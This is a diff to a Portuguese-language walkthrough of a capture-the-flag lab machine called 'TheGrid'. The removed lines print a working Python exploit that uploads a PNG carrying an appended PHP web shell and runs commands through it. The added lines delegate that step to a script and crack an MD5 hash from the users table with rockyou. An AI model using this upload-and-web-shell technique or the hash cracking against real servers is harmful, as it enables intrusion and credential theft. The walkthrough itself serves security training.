@@ -431,30 +431,15 @@ curl -s "http://$IP:<PORTA_ALTA>/assets/js/filter.js"
 curl -s "http://$IP:<PORTA_ALTA>/assets/js/upload.js"
 ```
 
-O endpoint de upload espera `{"name":"<ARQUIVO>.png.php","file":"data:image/png;base64,<DADOS>"}`. Gere uma imagem PNG válida e acrescente um pequeno script PHP depois do bloco `IEND`; use uma conta descartável da própria aplicação, se o endpoint exigir login. O exemplo abaixo envia o arquivo e testa a execução pelo diretório encontrado na enumeração. Instale `Pillow` e `requests` na Kali, se necessário.
+O endpoint de upload espera `{"name":"<ARQUIVO>.png.php","file":"data:image/png;base64,<DADOS>"}`. O script [enviar_png_php.py](scripts/enviar_png_php.py) gera uma imagem PNG válida, acrescenta um pequeno script PHP após o bloco `IEND`, envia o arquivo e testa sua execução com `id`. Use uma conta descartável da própria aplicação se o endpoint exigir login. Instale `Pillow` e `requests` na Kali, se necessário.
 
-```python
-import base64
-import io
-import requests
-from PIL import Image
-
-ip = "<IP>"
-port = "<PORTA_ALTA>"
-name = "probe.png.php"
-buf = io.BytesIO()
-Image.new("RGB", (1, 1), "red").save(buf, format="PNG")
-php = b"\n<?php system($_GET['cmd'] ?? 'id'); ?>"
-encoded = base64.b64encode(buf.getvalue() + php).decode()
-session = requests.Session()
-# Se a aplicação exigir autenticação, registre e faça login nessa sessão antes do POST.
-response = session.post(
-    f"http://{ip}:{port}/api/upload",
-    json={"name": name, "file": f"data:image/png;base64,{encoded}"},
-)
-print(response.status_code, response.text)
-print(session.get(f"http://{ip}:{port}/grid/{name}?cmd=id").text)
+```bash
+sudo apt install python3-pil python3-requests
+python3 scripts/enviar_png_php.py "http://$IP:<PORTA_ALTA>" \
+  --username '<USUARIO_LAB>' --password '<SENHA_LAB>'
 ```
+
+Se o upload for público, omita `--username` e `--password`. Ajuste `--public-path` conforme o diretório encontrado na enumeração.
 
 Para o shell interativo, conecte sua Kali à VM apenas pela rede VPN da sala.
 
@@ -464,7 +449,13 @@ cat /var/www/TheGrid/includes/dbauth.php
 mysql -u<USUARIO_DB> -p
 ```
 
-Dentro do MySQL, execute `show databases;`, `use <BANCO>;`, `show tables;` e `select * from users;`. Depois de descobrir o usuário e quebrar seu hash, entre nele e siga:
+Dentro do MySQL, execute `show databases;`, `use <BANCO>;`, `show tables;` e `select * from users;`. Para testar o hash MD5 localmente, use [testar_hash_md5.py](scripts/testar_hash_md5.py) com uma lista de palavras disponível na Kali:
+
+```bash
+python3 scripts/testar_hash_md5.py '<HASH_ENCONTRADO>' /usr/share/wordlists/rockyou.txt.gz
+```
+
+Depois de descobrir o usuário e a senha correspondente, entre nele e siga:
 
 ```bash
 su <USUARIO_ENCONTRADO>
